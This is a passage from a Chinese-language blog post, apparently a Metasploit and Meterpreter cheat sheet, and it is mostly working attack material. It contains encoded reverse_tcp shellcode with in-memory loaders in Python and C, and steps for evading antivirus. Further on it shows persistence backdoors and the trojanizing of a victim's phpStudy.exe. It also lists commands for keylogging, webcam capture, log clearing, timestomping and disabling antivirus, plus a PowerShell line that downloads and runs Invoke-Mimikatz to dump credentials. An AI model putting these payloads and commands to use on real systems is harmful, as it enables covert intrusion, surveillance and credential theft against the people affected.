{&quot;py2exe&quot;:{&quot;bundle_files&quot;:1,&quot;packages&quot;:&quot;ctypes&quot;,&quot;includes&quot;:&quot;base64,sys,socket,struct,time,code,platform,getpass,shutil&quot;,}},zipfile = None)</code></pre><ol><li><p><strong>把.py编译成.exe：</strong></p></li><li><p>python ./setup.py py2exe</p></li><li><p><img src="/MetasploitFramework/12.png" alt></p></li><li><p><strong>MSF开启监听：</strong></p></li><li><p>use exploit/multi/handler</p></li><li><p>set payload python/meterpreter/reverse_tcp</p></li><li><p>set lhost 192.168.100.4</p></li><li><p>run</p></li><li><p>执行test.exe即可反弹shell</p></li><li><p><img src="/MetasploitFramework/13.png" alt></p></li><li><p><img src="/MetasploitFramework/14.png" alt="virustotal扫描"></p></li><li><p><img src="/MetasploitFramework/15.png" alt="virscan扫描"></p></li><li><p><img src="/MetasploitFramework/16.png" alt="threatbook扫描"></p></li><li><p>pyinstaller生成exe</p></li><li><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.100.4 lport=4444 -e x86/shikata_ga_nai -i 7 -f py -o test.py</code></p></li><li><p><img src="/MetasploitFramework/19.png" alt></p></li></ol><p>test.py</p><pre><code>buf =  b&quot;&quot;buf += b&quot;\xd9\xeb\xb8\xae\xf4\xf6\x2c\xd9\x74\x24\xf4\x5b\x2b&quot;buf += b&quot;\xc9\xb1\x7e\x83\xeb\xfc\x31\x43\x16\x03\x43\x16\xe2&quot;buf += b&quot;\x5b\x2e\x3a\x94\x3a\x42\x95\xf7\xe5\x29\x3e\x0c\x4e&quot;buf += b&quot;\xf9\xf7\x5d\x08\xcc\x44\x89\x6b\xed\x4f\xb6\xb1\x6c&quot;buf += b&quot;\xfb\x5f\x43\xfd\x86\x3c\x74\xed\xf1\x79\xc1\xc2\x7d&quot;buf += b&quot;\xaa\x4f\x1a\x5c\x08\x82\x2e\x5a\x96\x94\x1b\x50\x84&quot;buf += b&quot;\x76\x05\x2b\x91\xc1\x8e\x61\x8d\x35\x45\x0d\xa2\xc8&quot;buf += b&quot;\x66\xd6\x90\xb9\x02\x31\x38\xcf\x0c\xca\xb4\xba\x3e&quot;buf += b&quot;\x9f\xff\x6f\x07\x54\x04\x0a\x82\x94\x2b\x39\xa9\xa1&quot;buf += b&quot;\x96\xa5\xf9\xed\x72\x9a\x86\xbc\xb1\x42\x09\x66\x74&quot;buf += b&quot;\x2c\x0c\x0e\xb3\x4c\x39\x87\x59\x6b\x49\x8f\xb0\xb4&quot;buf += b&quot;\x21\xe8\xfb\xcd\xe1\x1c\x70\xf6\x57\x79\x25\xc4\x85&quot;buf += b&quot;\x9f\x27\x08\xe1\x1f\xa9\x7f\xf1\xb2\x09\x54\x26\x4e&quot;buf += b&quot;\xd5\x8e\x1b\x7c\x6b\xf3\x9c\x5c\xc0\x7c\xed\xb1\xa4&quot;buf += b&quot;\x20\x43\x0a\x0f\x0b\x30\xfb\x3c\x9b\xd7\xe8\x43\x35&quot;buf += b&quot;\x61\xa1\x4b\xa7\x4b\x1c\xd3\xeb\x5c\x33\x3b\xaf\x17&quot;buf += b&quot;\xc5\xdc\xbb\xc8\xd6\x5f\xe2\x7e\x1e\xf3\xe5\x87\x8d&quot;buf += b&quot;\x2d\x78\x1f\x46\x06\xbc\x14\x29\xfb\x0f\xea\x36\xee&quot;buf += b&quot;\xc5\xea\xca\x55\xc3\x55\x93\x2b\x0a\x2b\x48\xf4\x20&quot;buf += b&quot;\xe0\xa3\xe3\x70\x69\xf7\x3b\x6e\xeb\x0d\x79\x3a\x56&quot;buf += b&quot;\xd1\xce\x60\x3c\xcd\x3d\x42\xec\xef\x64\x2d\xd4\x35&quot;buf += b&quot;\x0e\xab\xde\x41\x86\xb9\x4c\xd3\x2f\xa2\xbc\xd5\x0a&quot;buf += b&quot;\x27\x44\xd6\xa7\xef\x8f\x65\x94\x43\x8b\x01\x64\x6e&quot;buf += b&quot;\x13\x62\x3c\xb5\x9b\xfe\xcb\x9e\x9e\x3e\x6c\x3d\xc1&quot;buf += b&quot;\xc0\x86\x1f\x26\xba\x93\x10\xa2\x4d\x0c\x04\x14\xd8&quot;buf += b&quot;\xcc\xb7\xa8\xc6\x66\xa2\x45\x38\x99\x19\xcd\xff\x5b&quot;buf += b&quot;\x16\x9a\xb5\x1c\x84\x5c\x44\xe2\xc0\xca\xb0\x7f\xba&quot;buf += b&quot;\x42\x58\xa8\xe2\x5a\xe8\xe6\xa0\xd0\xd2\x20\xa7\x63&quot;buf += b&quot;\x2b\x18\x8d\x7b\x9a\x0b\xa2\xaf\xb2\xc1\x8f\x32\x19&quot;buf += b&quot;\x74\x3d\x4c\x79\xf2\x32\x0d\xb8\x0a\xc3\x90\xe5\xa2&quot;buf += b&quot;\x9a\x26\x05\x79\xd6\x77\xe8\x04\x0a\x20\xbf\x72\x0a&quot;buf += b&quot;\x8d\xb4\x73\x32\x17\xe4\x7b\x34\xc9\xc7\x20\x03\xc0&quot;buf += b&quot;\xd1\xd4\xa1\x49\xed\x4e\x57\xec\x6c\xd1\x8d\xd5\x42&quot;buf += b&quot;\x4d\x33\x81\x98\x18\x35\x31\x41\x03\x5c\x77\x57\x6d&quot;buf += b&quot;\x42\x3f\x7a\x23\x35\x18\xce\x7a\x8a\xd2\x4c\xd0\x4d&quot;buf += b&quot;\x53\x45\xf1\xca\x3b\x84\x8c\xb5\x00\xb8\x37\x7c\x8d&quot;buf += b&quot;\x11\x4a\xdb\xa2\x1c\xc8\x2e\xf7\xfa\x50\xc5\xdb\x96&quot;buf += b&quot;\xef\x8a\x9b\xb8\x69\xf1\x5d\xf1\x87\xee\xb6\x98\x15&quot;buf += b&quot;\x44\x59\x29\x01\xa1\x3a\x92\x8c\x90\x5e\x0b\xa9\x3c&quot;buf += b&quot;\x48\xcd\xae\xe9\xb4\x7e\x0f\x94\xf7\xaf\x5a\x21\x66&quot;buf += b&quot;\xce\x04\xa8\xe7\xde\x71\x0d\x03\xae\x3f&quot;</code></pre><p>shell.py</p><pre><code>import ctypesdef execute():    # Bind shell    shellcode = bytearray(    &quot;\xd9\xeb\xb8\xae\xf4\xf6\x2c\xd9\x74\x24\xf4\x5b\x2b&quot;    &quot;\xc9\xb1\x7e\x83\xeb\xfc\x31\x43\x16\x03\x43\x16\xe2&quot;    &quot;\x5b\x2e\x3a\x94\x3a\x42\x95\xf7\xe5\x29\x3e\x0c\x4e&quot;    &quot;\xf9\xf7\x5d\x08\xcc\x44\x89\x6b\xed\x4f\xb6\xb1\x6c&quot;    &quot;\xfb\x5f\x43\xfd\x86\x3c\x74\xed\xf1\x79\xc1\xc2\x7d&quot;    &quot;\xaa\x4f\x1a\x5c\x08\x82\x2e\x5a\x96\x94\x1b\x50\x84&quot;    &quot;\x76\x05\x2b\x91\xc1\x8e\x61\x8d\x35\x45\x0d\xa2\xc8&quot;    &quot;\x66\xd6\x90\xb9\x02\x31\x38\xcf\x0c\xca\xb4\xba\x3e&quot;    &quot;\x9f\xff\x6f\x07\x54\x04\x0a\x82\x94\x2b\x39\xa9\xa1&quot;    &quot;\x96\xa5\xf9\xed\x72\x9a\x86\xbc\xb1\x42\x09\x66\x74&quot;    &quot;\x2c\x0c\x0e\xb3\x4c\x39\x87\x59\x6b\x49\x8f\xb0\xb4&quot;    &quot;\x21\xe8\xfb\xcd\xe1\x1c\x70\xf6\x57\x79\x25\xc4\x85&quot;    &quot;\x9f\x27\x08\xe1\x1f\xa9\x7f\xf1\xb2\x09\x54\x26\x4e&quot;     &quot;\xd5\x8e\x1b\x7c\x6b\xf3\x9c\x5c\xc0\x7c\xed\xb1\xa4&quot;    &quot;\x20\x43\x0a\x0f\x0b\x30\xfb\x3c\x9b\xd7\xe8\x43\x35&quot;    &quot;\x61\xa1\x4b\xa7\x4b\x1c\xd3\xeb\x5c\x33\x3b\xaf\x17&quot;    &quot;\xc5\xdc\xbb\xc8\xd6\x5f\xe2\x7e\x1e\xf3\xe5\x87\x8d&quot;    &quot;\x2d\x78\x1f\x46\x06\xbc\x14\x29\xfb\x0f\xea\x36\xee&quot;    &quot;\xc5\xea\xca\x55\xc3\x55\x93\x2b\x0a\x2b\x48\xf4\x20&quot;    &quot;\xe0\xa3\xe3\x70\x69\xf7\x3b\x6e\xeb\x0d\x79\x3a\x56&quot;    &quot;\xd1\xce\x60\x3c\xcd\x3d\x42\xec\xef\x64\x2d\xd4\x35&quot;    &quot;\x0e\xab\xde\x41\x86\xb9\x4c\xd3\x2f\xa2\xbc\xd5\x0a&quot;    &quot;\x27\x44\xd6\xa7\xef\x8f\x65\x94\x43\x8b\x01\x64\x6e&quot;    &quot;\x13\x62\x3c\xb5\x9b\xfe\xcb\x9e\x9e\x3e\x6c\x3d\xc1&quot;    &quot;\xc0\x86\x1f\x26\xba\x93\x10\xa2\x4d\x0c\x04\x14\xd8&quot;    &quot;\xcc\xb7\xa8\xc6\x66\xa2\x45\x38\x99\x19\xcd\xff\x5b&quot;    &quot;\x16\x9a\xb5\x1c\x84\x5c\x44\xe2\xc0\xca\xb0\x7f\xba&quot;    &quot;\x42\x58\xa8\xe2\x5a\xe8\xe6\xa0\xd0\xd2\x20\xa7\x63&quot;    &quot;\x2b\x18\x8d\x7b\x9a\x0b\xa2\xaf\xb2\xc1\x8f\x32\x19&quot;    &quot;\x74\x3d\x4c\x79\xf2\x32\x0d\xb8\x0a\xc3\x90\xe5\xa2&quot;    &quot;\x9a\x26\x05\x79\xd6\x77\xe8\x04\x0a\x20\xbf\x72\x0a&quot;    &quot;\x8d\xb4\x73\x32\x17\xe4\x7b\x34\xc9\xc7\x20\x03\xc0&quot;    &quot;\xd1\xd4\xa1\x49\xed\x4e\x57\xec\x6c\xd1\x8d\xd5\x42&quot;    &quot;\x4d\x33\x81\x98\x18\x35\x31\x41\x03\x5c\x77\x57\x6d&quot;    &quot;\x42\x3f\x7a\x23\x35\x18\xce\x7a\x8a\xd2\x4c\xd0\x4d&quot;    &quot;\x53\x45\xf1\xca\x3b\x84\x8c\xb5\x00\xb8\x37\x7c\x8d&quot;    &quot;\x11\x4a\xdb\xa2\x1c\xc8\x2e\xf7\xfa\x50\xc5\xdb\x96&quot;    &quot;\xef\x8a\x9b\xb8\x69\xf1\x5d\xf1\x87\xee\xb6\x98\x15&quot;    &quot;\x44\x59\x29\x01\xa1\x3a\x92\x8c\x90\x5e\x0b\xa9\x3c&quot;    &quot;\x48\xcd\xae\xe9\xb4\x7e\x0f\x94\xf7\xaf\x5a\x21\x66&quot;    &quot;\xce\x04\xa8\xe7\xde\x71\x0d\x03\xae\x3f&quot;     )    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),    ctypes.c_int(len(shellcode)),    ctypes.c_int(0x3000),    ctypes.c_int(0x40))    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),    buf,    ctypes.c_int(len(shellcode)))    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),    ctypes.c_int(0),    ctypes.c_int(ptr),    ctypes.c_int(0),    ctypes.c_int(0),    ctypes.pointer(ctypes.c_int(0)))    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),    ctypes.c_int(-1))if __name__ == &quot;__main__&quot;:    execute()</code></pre><ol><li>pyinstaller -F –console shell.py</li><li><img src="/MetasploitFramework/20.png" alt></li><li>插眼</li></ol><p><strong>静态免杀三</strong><br>2. <code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b &#39;\x00&#39; lhost=192.168.100.4 lport=4444 -f c #生成基于C语言的shellcode</code></p><pre><code>unsigned char buf[] = &quot;\xbd\x3c\x18\xf8\x0a\xda\xdf\xd9\x74\x24\xf4\x5a\x33\xc9\xb1&quot;&quot;\x71\x31\x6a\x13\x83\xc2\x04\x03\x6a\x33\xfa\x0d\xb5\x27\xbb&quot;&quot;\xe4\x6d\x6a\xfb\x2e\x05\xb0\x08\x88\xd5\x71\x41\x43\x2b\xf9&quot;&quot;\xb6\x17\xa3\x05\xb5\x6f\x24\x7b\x0e\x5f\x21\x14\x2c\xa7\x37&quot;&quot;\x87\x2c\x26\x2c\x6a\xd5\x0d\xfd\x38\x81\x4b\xcc\x94\xae\x6c&quot;&quot;\x85\x7f\xb9\xc8\xf0\xd2\x1f\x91\x49\x41\x03\x47\x93\x35\x45&quot;&quot;\x09\x6e\xa1\x09\x45\xdf\xe0\x25\x29\x99\x23\xc4\xac\xf1\x5c&quot;&quot;\xa1\xdd\xb9\xc4\x52\x55\x07\x86\x08\xf4\x74\x63\x21\x65\xc7&quot;&quot;\x43\x62\x40\x3b\x01\x11\xa9\x22\x5b\x93\x08\xb3\x8e\x57\x9a&quot;&quot;\x3b\xf2\x6a\x27\x4d\x60\x98\x44\x77\x3d\x4b\x4e\x7f\xec\xdf&quot;&quot;\x46\xaf\x22\x17\xeb\xca\x61\xa4\xeb\xe7\x1d\x9b\x07\xe4\xc3&quot;&quot;\x80\x0b\xac\x45\xf1\xd7\x24\x6f\xb5\xb2\xf4\x44\x4e\x73\xea&quot;&quot;\xbb\x3b\x20\x76\x8a\x94\x4e\x4c\xcc\xe8\xd8\x5e\xf5\xca\xdf&quot;&quot;\x38\x7f\x43\x16\xcc\x25\xef\xb7\x50\xa0\xd2\x9d\x0f\x17\xfc&quot;&quot;\x8b\x3a\xde\xfd\x6a\xcf\x6b\x0b\x66\x82\x20\x84\x7b\x3d\x68&quot;&quot;\x2a\x0a\x1f\x72\x74\x97\x4b\xef\xcf\x50\x28\x7f\xd6\x52\x2e&quot;&quot;\xe1\x08\xce\x93\x75\xc4\x7f\x5c\xa0\x14\xed\x6d\x81\x8b\x78&quot;&quot;\x2d\x50\x23\x4b\xc8\x06\x24\xb2\x5a\x26\xdc\x5d\xd7\x05\x6c&quot;&quot;\xf6\x80\xe6\xfe\xb6\x49\xca\x8e\x49\xf8\x96\xb9\xaa\xd5\xbf&quot;&quot;\xad\xd8\xcf\x4b\xf6\x5f\xcf\x81\x9a\x06\x3b\x0f\x4f\x6c\x9d&quot;&quot;\xa2\xbc\x6b\x3c\x49\x09\x99\x80\x49\x05\xa8\x94\x6d\xc8\x58&quot;&quot;\x4c\x58\xf3\xe4\xee\xc8\x67\x92\xc5\xc8\xc5\x69\x88\x1e\xad&quot;&quot;\xd6\x98\x6c\x0d\x6e\xa7\x8b\x62\x22\xdc\xa5\xfd\x75\x1d\x7a&quot;&quot;\x35\x2d\x2a\x4d\xb6\xe1\x73\x8c\x3d\x74\xaa\xc5\x3a\x22\x51&quot;&quot;\xd0\xe8\x67\x4b\xc7\xae\xb8\x28\xa5\x19\x41\x07\x34\xdc\xae&quot;&quot;\xb4\x60\x0d\xda\xfd\xc7\x36\x54\x26\x35\xd9\x8a\x5b\x44\x7a&quot;&quot;\x90\x22\x34\x49\xe8\x8f\x60\xa8\xd3\xc6\xa3\x8e\xe7\x62\x84&quot;&quot;\x7c\x16\xb0\x50\x75\x1c\xd4\x9d\xfe\x35\x13\x80\x05\xc7\x04&quot;&quot;\xf7\x60\x43\x2d\xdd\x04\x16\x36\xba\xaa\xb6\x8e\x5d\x05\x19&quot;&quot;\x2d\x8e\xb6\xde\x3b\x8b\x72\x15\x1a\x38\x99\x8e\xe1\x80\x5d&quot;&quot;\x6b\x11\xea\xa4\x0c\x88\x58\xa6\x90\x6e\xdc\xfe\x40\xb1\xa7&quot;&quot;\x78\x9c\x7f\xcc\xed\x19\x8b\x48\xd5\x6f\x03&quot;;#pragma comment(linker,&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;) //windows控制台程序不出黑窗口main(){    ( (void(*)(void))&amp;buf)();}</code></pre><ol start="4"><li>然后使用vc++6.0、VS等等编译器编译，生成exe文件。</li><li><img src="/MetasploitFramework/17.png" alt></li><li><img src="/MetasploitFramework/18.png" alt></li></ol><p><strong>动态免杀</strong></p><ol><li>即使meterpreter回连成功了，杀软会在meterpreter交互时报毒。</li><li>切换不同的payload来绕过杀软动态检测，还有设置：</li><li>set EnableStageEncoding true #将控制端向被控制端发送的stage进行编码，使用reverse_tcp_rc4也有同样的效果，而且不用设置stageencoder选项</li><li>set stageencoder x86/fnstenv_mov</li><li>set stageencodingfallback false</li><li>set exitonsession false  #可以让建立监听的端口继续保持侦听，可以接受多个session</li><li>set SessionCommunicationTimeout 0 #默认一个会话在5分钟没有任何活动，就会被杀死，设置为0防止被杀死</li><li>set SessionExpirationTimeout 0 #默认一周后，强制关闭会话，设置为0可永久不会被关闭</li><li>set stagerverifysslcert false  #防止获取shell的时候出现的SSL_accept错误</li><li>set prependmigrate true #自动注入进程</li><li>set prependmigrateProc svchost.exe</li><li>set autorunscript migrate -f #获取shell后，将自动迁移到另一个进程</li><li>set AutoRunScript post/windows/manage/migrate</li></ol><h2 id="0x12-常驻免杀"><a href="#0x12-常驻免杀" class="headerlink" title="0x12 常驻免杀"></a>0x12 常驻免杀</h2><ol><li><strong>msf的persistence和metsvc</strong></li><li>msf5 &gt; search persistence #搜索相关payload</li><li><strong>powerspolit</strong></li></ol><h2 id="0x20-Metasploit"><a href="#0x20-Metasploit" class="headerlink" title="0x20 Metasploit"></a>0x20 Metasploit</h2><ol><li>use [name|term|index] #使用指定模块，auxiliary/、evasion/、exploit/、payload/、post/，可当作搜索使用</li><li>use ms17-010</li><li><img src="/MetasploitFramework/1.png" alt></li></ol><h2 id="0x21-信息搜集"><a href="#0x21-信息搜集" class="headerlink" title="0x21 信息搜集"></a>0x21 信息搜集</h2><ol><li>use auxiliary/scanner/discovery/arp_sweep</li><li>use auxiliary/scanner/ftp/anonymous</li><li>use auxiliary/scanner/ftp/ftp_login</li><li>use auxiliary/scanner/http/backup_file</li><li>use auxiliary/scanner/http/brute_dirs</li><li>use auxiliary/scanner/http/dir_scanner</li><li>use auxiliary/scanner/http/web_vulndb</li><li>use auxiliary/scanner/portscan/syn</li><li>use auxiliary/scanner/rdp/rdp_scanner</li><li>use auxiliary/gather/censys_search</li><li>use auxiliary/gather/enum_dns</li><li>use auxiliary/gather/shodan_search</li><li>use auxiliary/scanner/http/crawler</li><li>use auxiliary/scanner/http/phpmyadmin_login</li><li>use auxiliary/scanner/http/svn_scanner</li><li><img src="/MetasploitFramework/2.png" alt> </li><li><img src="/MetasploitFramework/3.png" alt> </li></ol><h2 id="0x22-漏洞探测与利用"><a href="#0x22-漏洞探测与利用" class="headerlink" title="0x22 漏洞探测与利用"></a>0x22 漏洞探测与利用</h2><ol><li>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</li><li>use auxiliary/admin/http/gitstack_rest</li><li>use auxiliary/admin/http/tomcat_administration </li><li>use auxiliary/admin/mssql/mssql_enum </li><li>use auxiliary/admin/oracle/oraenum</li><li>use auxiliary/admin/smb/ms17_010_command</li><li>use auxiliary/scanner/http/citrix_dir_traversal</li><li>use auxiliary/scanner/http/iis_shortname_scanner </li><li><strong>漏洞不存在例子：</strong></li><li><img src="/MetasploitFramework/4.png" alt> </li><li><img src="/MetasploitFramework/5.png" alt> </li><li><strong>漏洞存在例子：</strong></li><li><img src="/MetasploitFramework/6.png" alt></li><li><img src="/MetasploitFramework/7.png" alt></li></ol><h2 id="0x23-权限提升"><a href="#0x23-权限提升" class="headerlink" title="0x23 权限提升"></a>0x23 权限提升</h2><ol><li>getsystem #最直接的提权命令</li><li><img src="/MetasploitFramework/8.png" alt></li><li><strong>通过进程注入使用可信任发布者证书绕过UAC</strong></li><li>use exploit/windows/local/bypassuac</li><li>set session 1</li><li>exploit</li><li>use exploit/windows/local/bypassuac_fodhelper</li><li>set session 1</li><li>exploit</li></ol><h2 id="0x24-内网渗透"><a href="#0x24-内网渗透" class="headerlink" title="0x24 内网渗透"></a>0x24 内网渗透</h2><ol><li>run get[tab两下] #列出相关命令</li><li>run get_env #获取环境变量</li><li>run get_application_list #获取应用列表</li><li>run get_local_subnets #获取网段</li></ol><h2 id="0x25-MSF5-gt-命令"><a href="#0x25-MSF5-gt-命令" class="headerlink" title="0x25 MSF5&gt;命令"></a>0x25 MSF5&gt;命令</h2><ol><li>sessions -l #列出所有会话</li><li>sessions [num] #切换到指定会话</li><li>sessions -K #杀死所有会话</li></ol><hr><h2 id="0x30-Meterpreter"><a href="#0x30-Meterpreter" class="headerlink" title="0x30 Meterpreter"></a>0x30 Meterpreter</h2><h2 id="0x31-常用命令"><a href="#0x31-常用命令" class="headerlink" title="0x31 常用命令"></a>0x31 常用命令</h2><ol><li>help #查看帮助</li><li>background #当前会话放到后台</li><li>run &lt;script&gt; #执行现有模块，run [按两下tab即可列出已有脚本]</li><li>info &lt;script&gt; #查看脚本的信息，info [按两下tab即可列出已有脚本] </li><li>getuid #查看权限</li><li>getsystem #最直接的提权命令</li><li>sysinfo #查看目标主机的系统信息</li><li>idletime #查看目标主机闲置时间</li><li>reboot/shutdown #重启关机</li><li>shell #进入目标主机的shell</li><li>meterpreter &gt; powershell_shell #切换到powershell终端</li><li>meterpreter &gt; powershell_import xxx.ps1 #执行ps1文件</li><li>meterpreter &gt; powershell_execute xxx.exe #</li><li><code>ps</code> #列出所有进程</li><li><code>getpid</code> #获取当前进程的pid</li><li><code>migrate PID</code> #迁移服务到其他进程</li><li>kill PID #杀死进程</li><li><code>run post/windows/manage/migrate</code> #自动迁移进程到其他进程</li><li>load [tab两下] #加载模块</li></ol><h2 id="0x32-文件操作命令"><a href="#0x32-文件操作命令" class="headerlink" title="0x32 文件操作命令"></a>0x32 文件操作命令</h2><ol><li>cat [filename] #读文件</li><li>getwd #获取目录</li><li>cd #切换目录</li><li>download [filename] #下载文件</li><li>upload [filename] #上传文件</li></ol><h2 id="0x33-网络命令"><a href="#0x33-网络命令" class="headerlink" title="0x33 网络命令"></a>0x33 网络命令</h2><ol><li>arp #查看目标主机arp缓存</li><li>getproxy #查看当前代理设置</li><li><code>portfwd add -l 33389 -p 3389 -r 127.0.0.1</code> #端口转发，将目标主机的3389转发到本机的33389，rdesktop 127.0.0.1:33389</li><li>route #查看路由表</li><li>run autoroute -s 192.168.10.1/24 #添加到目标网络环境</li><li>run autoroute -p #查看添加的路由</li><li>run post/windows/gather/arp_scanner rhosts=IP/24 #扫描主机</li><li>run auxiliary/scanner/portscan/tcp rhosts=IP ports=PORT #扫描端口</li></ol><h2 id="0x34-系统命令"><a href="#0x34-系统命令" class="headerlink" title="0x34 系统命令"></a>0x34 系统命令</h2><ol><li>clearev #清除日志</li><li>execute -H -i -f cmd.exe #执行命令，-H：隐藏，-i：交互</li><li>getenv #获取环境变量</li><li>getprivs #获取当前进程可用的所有特权</li><li>getsid #获取当前用户的SID</li><li>pgrep #按名称过滤进程</li><li>pkill #按名称杀死进程</li><li>reg #修改远程注册表</li></ol><h2 id="0x35-其他命令"><a href="#0x35-其他命令" class="headerlink" title="0x35 其他命令"></a>0x35 其他命令</h2><ol><li>uictl [enable/disable] [keyboard/mouse/all] #开启或禁止键盘、鼠标</li><li>webcam_list #查看摄像头</li><li>webcam_snap #通过摄像头拍照</li><li>webcam_stream #通过摄像头开启视频</li><li>screenshot #截图</li><li>run post/windows/gather/checkvm #检查是否虚拟机</li><li>run post/windows/manage/killav #关闭杀软</li><li>run post/windows/manage/enable_rdp #开3389</li><li>run getgui -e #开启远程桌面</li><li>run getgui -f 33389 -e #3389端口转发到33389</li><li>run getgui -u username -p password #添加用户</li><li>keyscan_start #开启键盘记录</li><li>keyscan_dump #查看键盘记录</li><li>keyscan_stop #停止键盘记录</li></ol><h2 id="0x36-timestomp（文件时间）"><a href="#0x36-timestomp（文件时间）" class="headerlink" title="0x36 timestomp（文件时间）"></a>0x36 timestomp（文件时间）</h2><ol><li><code>timestomp -v c:\\test.exe</code> #显示文件时间信息，Modified：修改日期，Accessed：访问时间，Created：创建日期</li><li><img src="/MetasploitFramework/25.png" alt></li><li>timestomp -z [时间，格式：MM/DD/YYYY HH24:MI:SS] [目标文件]</li><li><code>timestomp -z &quot;01/01/2020 00:00:00&quot; c:\\test.exe</code> #修改文件时间</li><li><img src="/MetasploitFramework/26.png" alt></li><li>timestomp -b [目标文件] #清空文件时间</li></ol><h2 id="0x40-权限维持"><a href="#0x40-权限维持" class="headerlink" title="0x40 权限维持"></a>0x40 权限维持</h2><p><strong>persistence模块</strong><br>2. run persistence -h #查看帮助<br>4. <img src="/MetasploitFramework/9.png" alt><br>3. -A #自动匹配连接代理<br>4. -L &lt;payload位置&gt;<br>5. -P <payload> #默认windows/meterpreter/reverse_tcp<br>6. -S #作为system权限执行<br>7. -U #用户登录自动启动代理<br>8. -X #系统启动自动启动代理<br>9. -i num #间隔num秒尝试连接<br>10. -p #攻击者端口<br>11. -r #攻击者IP</payload></p><ol><li><strong>安装后门</strong></li><li>run persistence -X -i 30（多少秒发送一次连接） -p 1314（端口） -r 192.168.100.4（控制者IP）</li></ol><p><strong>获取meterpreter后，假设session为1</strong></p><ol><li>background </li><li><strong>攻击机开启后门监听</strong></li><li>use exploit/multi/handler</li><li>set payload windows/meterpreter/reverse_tcp</li><li>set lhost 192.168.100.4 #端口跟之前的获取到的meterpreter一样</li><li>run -j #后台监听</li><li>use exploit/windows/local/registry_persistence</li><li>set session 1</li><li>run #这样就会在受害机的注册表中注入后门，受害机重启后会操纵powershell来执行代码反弹meterpreter</li><li>受害机重启登录后就会获取新meterpreter</li><li><img src="/MetasploitFramework/22.png" alt></li><li><strong>相关模块</strong></li><li><img src="/MetasploitFramework/23.png" alt></li></ol><p><strong>捆绑守护进程，假设phpstudy.exe，获得meterpreter之后</strong></p><ol><li>ps -S phpStudy.exe #找到目的应用程序</li><li>pkill phpStudy.exe #杀掉应用程序</li><li>search -f phpStudy.exe -d C: #可遍历查找目的应用程序</li><li>download C:\phpStudy\phpStudy.exe #直接下载目的应用程序</li><li>background #meterpreter放到后台</li><li><strong>在目的程序上捆绑后门</strong></li><li>use payload/windows/meterpreter/reverse_tcp</li><li>set lhost 192.168.100.4 #攻击机IP</li><li>generate -p windows -x /root/phpStudy.exe -k -f exe -o /root/phpStudy_backdoor.exe</li><li>use exploit/multi/handler </li><li>set payload windows/meterpreter/reverse_tcp</li><li>set lhost 192.168.100.4</li><li>run -j</li><li><img src="/MetasploitFramework/24.png" alt></li><li>回到meterpreter</li><li>sessions 2</li><li>cd C:\phpStudy\</li><li>mv phpStudy.exe phpStudy_bak.exe</li><li>upload /root/phpStudy_backdoor.exe</li><li>mv phpStudy_backdoor.exe phpStudy.exe</li><li>shell</li><li>net start phpStudy.exe </li><li>phpStudy.exe启动后就会获取meterpreter</li></ol><p><strong>metsvc模块</strong></p><ol><li><img src="/MetasploitFramework/10.png" alt></li><li>run metsvc #即可重新获取新meterpreter</li></ol><h2 id="0x50-痕迹清除"><a href="#0x50-痕迹清除" class="headerlink" title="0x50 痕迹清除"></a>0x50 痕迹清除</h2><ol><li>clearev #windows版清除日志</li></ol><h2 id="0x60-mimikatz相关命令"><a href="#0x60-mimikatz相关命令" class="headerlink" title="0x60 mimikatz相关命令"></a>0x60 mimikatz相关命令</h2><ol><li>getuid #查看权限</li><li>getsystem #最直接的提权命令</li><li>run hashdump #获取密码的hash</li><li>load mimikatz #加载mimikatz扩展</li><li>load kiwi #加载mimikatz扩展（新版）</li><li>tspkg #尝试检索tspkg凭证</li><li>msv #尝试检索tspkg凭据（hash）</li><li>hashdump #获取hash</li></ol><p><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener"><strong>impacket secretsdump.py</strong></a></p><ol><li>secretsdump.py [username]:[password]@IP</li><li><img src="/MetasploitFramework/27.png" alt></li></ol><p><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener"><strong>impacket psexec.py</strong></a></p><ol><li>psexec.py [username]:[password]@IP cmd</li><li><img src="/MetasploitFramework/28.png" alt></li><li>powershell -exec bypass -command “iex(new-object system.net.webclient).downloadstring(‘URL/Invoke-Mimikatz.ps1’);invoke-mimikatz”</li><li>sekurlsa::logonpasswords</li></ol><h2 id="0xF0-工具帮助信息"><a href="#0xF0-工具帮助信息" class="headerlink" title="0xF0 工具帮助信息"></a>0xF0 工具帮助信息</h2><p><span id="msfvenom"><strong>msfvenom</strong></span></p><pre><code>Options:    -l, --list            &lt;type&gt;        # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等    -p, --payload         &lt;payload&gt;     # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取        --list-options                  # 列出--payload &lt;value&gt; 的标准，高级和规避选项    -f, --format          &lt;format&gt;      # 指定 Payload 的输出格式(使用 --list formats 列出)    -e, --encoder         &lt;encoder&gt;     # 指定使用的 Encoder (使用 --list encoders 列出)        --sec-name        &lt;value&gt;       # 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串        --smallest                      # 使用所有可用的编码器生成最小的payload        --encrypt         &lt;value&gt;       # 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)        --encrypt-key     &lt;value&gt;       # 用于加密的密钥        --encrypt-iv      &lt;value&gt;       # 加密的初始化向量    -a, --arch            &lt;arch&gt;        # 指定目标系统架构(使用 --list archs  列出)        --platform        &lt;platform&gt;    # 指定目标系统平台 (使用 --list platforms 列出)    -o, --out             &lt;path&gt;        # 保存payload文件    -b, --bad-chars       &lt;list&gt;        # 设置需要在 Payload 中避免出现的字符，如： &#39;\x00\xff&#39;    -n, --nopsled         &lt;length&gt;      # 指定 nop 在 payload 中的数量    -s, --space           &lt;length&gt;      # 设置未经编码的 Payload 的最大长度        --encoder-space   &lt;length&gt;      # 编码后的 Payload 的最大长度    -i, --iterations      &lt;count&gt;       # 设置 Payload 的编码次数    -c, --add-code        &lt;path&gt;        # 